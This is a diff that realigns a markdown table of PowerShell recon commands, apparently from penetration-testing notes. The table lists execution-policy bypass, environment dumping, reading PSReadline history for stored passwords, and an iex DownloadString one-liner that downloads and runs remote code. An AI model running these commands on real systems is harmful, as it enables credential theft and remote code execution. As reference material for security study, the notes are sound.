@@ -28,14 +28,14 @@ This command summarizes the host's information in one output, generating fewer l
 
 PowerShell provides many built-in functions and modules for recon and administration.
 
-|Cmdlet / Command|Description|
-|---|---|
-|`Get-Module`|Lists available modules loaded for use|
-|`Get-ExecutionPolicy -List`|Prints execution policy settings for each scope|
-|`Set-ExecutionPolicy Bypass -Scope Process`|Changes policy for current process only|
-|`Get-ChildItem Env:|ft Key,Value`|
-|`Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`|Gets PowerShell history (may contain passwords)|
-|`powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <commands>"`|Download and execute a file from the web (if allowed)|
+| Cmdlet / Command                                                                           | Description                                           |
+| ------------------------------------------------------------------------------------------ | ----------------------------------------------------- |
+| `Get-Module`                                                                               | Lists available modules loaded for use                |
+| `Get-ExecutionPolicy -List`                                                                | Prints execution policy settings for each scope       |
+| `Set-ExecutionPolicy Bypass -Scope Process`                                                | Changes policy for current process only               |
+| `Get-ChildItem Env:                                                                        | ft Key,Value`                                         |
+| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Gets PowerShell history (may contain passwords)       |
+| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <commands>"`     | Download and execute a file from the web (if allowed) |
 
 **Example:**
 
